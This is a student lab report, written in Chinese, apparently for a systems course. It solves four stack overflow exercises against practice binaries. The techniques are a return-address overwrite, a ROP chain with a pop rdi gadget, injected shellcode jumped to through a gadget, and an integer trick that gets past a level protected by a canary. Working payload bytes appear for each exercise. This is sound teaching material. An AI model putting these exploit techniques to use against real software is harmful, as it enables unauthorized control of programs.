# 栈溢出攻击实验报告
---
<center>
吴怡蓓
2024201642
</center>


## Problem 1

### 解题思路
通过 `objdump` 反汇编 `problem1`，我发现 `func` 函数中存在栈溢出漏洞。该函数使用 `strcpy` 将输入复制到栈上的缓冲区，但未检查长度。
- 缓冲区位于 `rbp-0x8`。
- 函数返回地址位于 `rbp+0x8`。
- 我们需要覆盖 8 字节的 buffer 和 8 字节的 saved rbp，总共 16 字节的 padding，然后覆盖返回地址。
- 目标函数 `func1` 地址为 `0x401216`，它会输出 "Yes!I like ICS!"。

### Payload 设计
```python
padding = b'A' * 16
target_address = b'\x16\x12\x40\x00\x00\x00\x00\x00' # 0x401216
payload = padding + target_address
```

### 攻击结果
运行 `./problem1 ans1.txt` 后，程序成功跳转到 `func1` 并输出：
```
Yes!I like ICS!
```

---

## Problem 2

### 解题思路
`problem2` 开启了 NX (No-Execute) 保护，因此无法在栈上执行代码。题目要求输出 "Yes!I like ICS!"，这在 `func2` (`0x401216`) 中实现。
- `func` 函数存在类似的可溢出缓冲区，大小 8 字节，使用 `strncpy` 读取 0x38 字节，造成溢出。
- `func2` 检查参数 `%edi` 是否等于 `0x3f8` (1016)。
- 在 64 位 Linux 中，第一个参数通过 `%rdi` 寄存器传递。
- 我找到一个 ROP gadget: `pop rdi; ret` 地址为 `0x4012c7`。
- 攻击链：覆盖返回地址 -> `pop rdi; ret` -> `0x3f8` -> `func2`。

### Payload 设计
```python
padding = b'A' * 16
pop_rdi = 0x4012c7
arg_val = 0x3f8
func2_addr = 0x401216

payload = padding + p64(pop_rdi) + p64(arg_val) + p64(func2_addr)
```

### 攻击结果
运行 ./problem2 ans2.txt 后，成功绕过参数检查并输出：
```
Yes!I like ICS!
```

---

## Problem 3

### 解题思路
`problem3` 没有开启 NX 保护（或者隐含栈可执行）。`func` 函数即使将返回地址覆盖，也难以直接跳转到我们存放 shellcode 的地址，因为栈地址可能是随机的（ASLR）。
- 但程序中有一个特殊的函数 `jmp_xs` (`0x401334`)，它会跳转到 `saved_rsp + 0x10` 的位置。
- 分析发现 `saved_rsp + 0x10` 正好指向溢出缓冲区的起始位置 (`rbp-0x20`)。
- 因此，我们可以将 Shellcode 放在 buffer 开头，然后将返回地址覆盖为 `jmp_xs` 的地址。
- 目标：调用 `func1` (`0x401216`)，要求 `%edi` = 114 (`0x72`)。

### Payload 设计
Shellcode 汇编：
```assembly
mov rdi, 0x72      ; 参数 114
mov rax, 0x401216  ; func1 地址
call rax           ; 调用 func1
```

Payload 结构：
```python
shellcode = b'\x48\xc7\xc7\x72\x00\x00\x00\x48\xc7\xc0\x16\x12\x40\x00\xff\xd0'
padding = b'\x90' * (32 - len(shellcode)) # 填充满 32 字节 buffer
saved_rbp = b'B' * 8
jmp_xs = 0x401334

payload = shellcode + padding + saved_rbp + p64(jmp_xs)
```

### 攻击结果
运行 ./problem3 ans3.txt 后，Shellcode 成功执行，调用 `func1` 输出：
```
Your lucky number is 114
```

---

## Problem 4

### Canary 保护机制分析
`problem4` 启用了 Stack Canary 保护。通过反汇编可以看到：
1.  **设置 Canary**: 在 `func` 函数开头 (`0x136c`)：
    ```assembly
    movq %fs:0x28, %rax
    movq %rax, -0x8(%rbp)
    ```
    程序从 `%fs:0x28` 读取一个随机值（Canary），存放到栈帧的 `-0x8(%rbp)` 位置。

2.  **检查 Canary**: 在函数返回前 (`0x140a`)：
    ```assembly
    movq -0x8(%rbp), %rax
    subq %fs:0x28, %rax
    je ...
    call __stack_chk_fail
    ```
    程序再次读取 `%fs:0x28` 并与栈上的值比较。如果不一致（说明发生了栈溢出覆盖了 Canary），则调用 `__stack_chk_fail` 终止程序。

### 解题思路
由于 Canary 的存在，使用传统的栈溢出覆盖返回地址变得困难。观察程序逻辑：
- 程序接受一个整数输入。
- 核心循环逻辑中，如果输入的整数导致循环次数过多或特定条件满足，会调用 `func1`。
- 如果输入 `-1` (`0xffffffff`)：
    1.  程序检查是否 `>= 0xfffffffe` (unsigned)，条件成立。
    2.  进入一个循环，将 n 递减 `0xfffffffe` 次。
    3.  最终计算结果使得后续判定条件成立 (`n == 1` 且 `original_n == -1`)。
    4.  程序主动调用 `func1`。

### Payload
只需要输入整数 `-1`。

### 攻击结果
程序解密并输出了通关提示：
```
pass hint
```

## 参考资料
- [CTF Wiki Stack Overflow](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/)
- Intel x64 Developer Manual
